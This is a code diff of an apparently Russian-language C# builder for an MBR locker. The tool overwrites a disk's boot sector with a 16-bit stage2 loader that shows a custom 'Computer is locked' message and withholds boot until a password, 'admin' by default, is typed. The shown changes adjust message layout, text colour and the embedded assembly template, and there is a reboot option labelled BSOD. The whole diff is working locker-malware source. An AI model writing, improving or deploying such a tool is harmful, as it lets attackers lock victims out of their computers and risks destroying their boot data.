@@ -424,33 +424,26 @@ namespace MbrLockerBuilder
                 Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
                 
                 // ============================================================
-                // ЗАПИСЫВАЕМ ТЕКСТ В ОТДЕЛЬНЫЕ СЕКТОРА (4, 5, 6)
-                // ============================================================
-                
-                string title = this.txtTitle.Text.Trim();
-                string body = this.txtBody.Text.Trim();
-                if (string.IsNullOrEmpty(title)) title = "LOCKED";
-                if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
+// ЗАПИСЫВАЕМ ТЕКСТ В ОТДЕЛЬНЫЕ СЕКТОРА (4, 5, 6)
+// ============================================================
 
-                string border = "========================================\r\n";
-                string formattedTitle = "     " + title + "     \r\n";
-                string formattedBody = body.Replace("\n", "\r\n");
+string title = this.txtTitle.Text.Trim();
+string body = this.txtBody.Text.Trim();
+if (string.IsNullOrEmpty(title)) title = "LOCKED";
+if (string.IsNullOrEmpty(body)) body = "Computer is locked.";
 
-                string fullText = border + formattedTitle + border + "\r\n" + formattedBody;
+// Убираем рамки, оставляем только заголовок
+string formattedTitle = "     " + title + "     \r\n";
+// Добавляем \0 в конец, чтобы print остановился
+string formattedBody = body.Replace("\n", "\r\n") + "\0";
 
-                byte[] textBytes = Encoding.GetEncoding(866).GetBytes(fullText);
-                if (textBytes.Length > 512 * 3)
-                {
-                    Array.Resize(ref textBytes, 512 * 3);
-                }
+byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(formattedTitle);
+if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
+Array.Copy(titleBytes, 0, fullImage, 512 * 4, titleBytes.Length);
 
-                byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(border + formattedTitle + border + "\r\n");
-                if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
-                Array.Copy(titleBytes, 0, fullImage, 512 * 4, titleBytes.Length);
-                
-                byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(formattedBody);
-                if (bodyBytes.Length > 512 * 2) Array.Resize(ref bodyBytes, 512 * 2);
-                Array.Copy(bodyBytes, 0, fullImage, 512 * 5, bodyBytes.Length);
+byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(formattedBody);
+if (bodyBytes.Length > 512 * 2) Array.Resize(ref bodyBytes, 512 * 2);
+Array.Copy(bodyBytes, 0, fullImage, 512 * 5, bodyBytes.Length);
 
                 this.lblStatus.Text = "5/7 Получение template.exe...";
                 Application.DoEvents();
@@ -632,37 +625,34 @@ dw 0xAA55";
         }
 
         private string GenerateStage2()
-        {
-            string template = null;
+{
+    string template = null;
 
-            // 1. Пробуем загрузить из встроенных ресурсов (внутри EXE)
-            try
+    try
+    {
+        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.stage2.asm"))
+        {
+            if (stream != null)
             {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.stage2.asm"))
+                using (StreamReader reader = new StreamReader(stream))
                 {
-                    if (stream != null)
-                    {
-                        using (StreamReader reader = new StreamReader(stream))
-                        {
-                            template = reader.ReadToEnd();
-                        }
-                    }
+                    template = reader.ReadToEnd();
                 }
             }
-            catch { }
+        }
+    }
+    catch { }
 
-            // 2. Если не вышло — ищем в папке locker (для отладки)
-            if (string.IsNullOrEmpty(template))
-            {
-                string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "stage2.asm");
-                if (File.Exists(localPath))
-                    template = File.ReadAllText(localPath);
-            }
+    if (string.IsNullOrEmpty(template))
+    {
+        string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "stage2.asm");
+        if (File.Exists(localPath))
+            template = File.ReadAllText(localPath);
+    }
 
-            // 3. Если всё равно пусто — используем запасной шаблон
-            if (string.IsNullOrEmpty(template))
-            {
-                template = @"
+    if (string.IsNullOrEmpty(template))
+    {
+        template = @"
 BITS 16
 ORG 0x8000
 
@@ -677,7 +667,7 @@ start_stage2:
     mov dx, 0x184F
     int 0x10
 
-    mov ax, 0x0A00
+    mov ax, {TEXT_COLOR}
     int 0x10
 
     mov ax, 0x0000
@@ -709,6 +699,12 @@ start_stage2:
 
     mov si, 0x9200
     call print
+
+    mov ah, 0x02
+    mov bh, 0x00
+    mov dh, 24
+    mov dl, 0
+    int 0x10
 
     mov si, msg_prompt
     call print
@@ -746,15 +742,9 @@ restore_mbr:
     int 0x13
     jc .error
 
-    mov ax, 0x0000
-    mov es, ax
-    mov bx, 0x7E00
     mov ah, 0x03
     mov al, 1
-    mov ch, 0
     mov cl, 1
-    mov dh, 0
-    mov dl, 0x80
     int 0x13
 .error:
     popa
@@ -766,10 +756,7 @@ load_os:
     mov bx, 0x7C00
     mov ah, 0x02
     mov al, 1
-    mov ch, 0
     mov cl, 1
-    mov dh, 0
-    mov dl, 0x80
     int 0x13
     jmp 0x0000:0x7C00
 
@@ -839,9 +826,11 @@ hang:
     jmp hang
 
 msg_prompt:
-    db 13,10,'Password: ',0
+    db 'Password: ',0
+
 msg_wrong:
     db 13,10,'Wrong password!',13,10,0
+
 msg_error:
     db 'Load error!',0
 
@@ -850,59 +839,60 @@ password:
 
 buffer:
     times 64 db 0
+
 password_ok:
     db 0";
-            }
+    }
 
-            string password = this.txtPassword.Text.Trim();
-            if (string.IsNullOrEmpty(password)) password = "admin";
+    string password = this.txtPassword.Text.Trim();
+    if (string.IsNullOrEmpty(password)) password = "admin";
 
-            string passwordHex;
-            if (ContainsRussian(password))
-            {
-                string cleanPassword = new string(password.Where(c => c < 128).ToArray());
-                if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
-                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
-            }
-            else
-            {
-                passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
-            }
+    string passwordHex;
+    if (ContainsRussian(password))
+    {
+        string cleanPassword = new string(password.Where(c => c < 128).ToArray());
+        if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
+        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
+    }
+    else
+    {
+        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
+    }
 
-            template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
+    template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");
 
-            string textColor = "0A";
-            switch (this.cmbTextColor.SelectedIndex)
-            {
-                case 0: textColor = "0A"; break;
-                case 1: textColor = "0C"; break;
-                case 2: textColor = "0F"; break;
-                case 3: textColor = "0B"; break;
-                case 4: textColor = "0E"; break;
-                case 5: textColor = "0D"; break;
-            }
+    string textColor = "0A";
+    switch (this.cmbTextColor.SelectedIndex)
+    {
+        case 0: textColor = "0A"; break;
+        case 1: textColor = "0C"; break;
+        case 2: textColor = "0F"; break;
+        case 3: textColor = "0B"; break;
+        case 4: textColor = "0E"; break;
+        case 5: textColor = "0D"; break;
+    }
 
-            string bgColor = "00";
-            switch (this.cmbBgColor.SelectedIndex)
-            {
-                case 0: bgColor = "00"; break;
-                case 1: bgColor = "10"; break;
-                case 2: bgColor = "40"; break;
-                case 3: bgColor = "20"; break;
-            }
+    string bgColor = "00";
+    switch (this.cmbBgColor.SelectedIndex)
+    {
+        case 0: bgColor = "00"; break;
+        case 1: bgColor = "10"; break;
+        case 2: bgColor = "40"; break;
+        case 3: bgColor = "20"; break;
+    }
 
-            bool enableBSOD = this.chkBSOD.Checked;
+    bool enableBSOD = this.chkBSOD.Checked;
 
-            template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
-            template = template.Replace("mov ax, 0x0A00", "mov ax, 0x" + textColor + "00");
+    template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
+    template = template.Replace("{TEXT_COLOR}", "0x" + textColor + "00");
 
-            if (enableBSOD)
-            {
-                template = template.Replace("jmp hang", "int 0x19");
-            }
+    if (enableBSOD)
+    {
+        template = template.Replace("jmp hang", "int 0x19");
+    }
 
-            return template;
-        }
+    return template;
+}
 
         private string FindResourceByPartialName(string partialName, string fileName)
         {
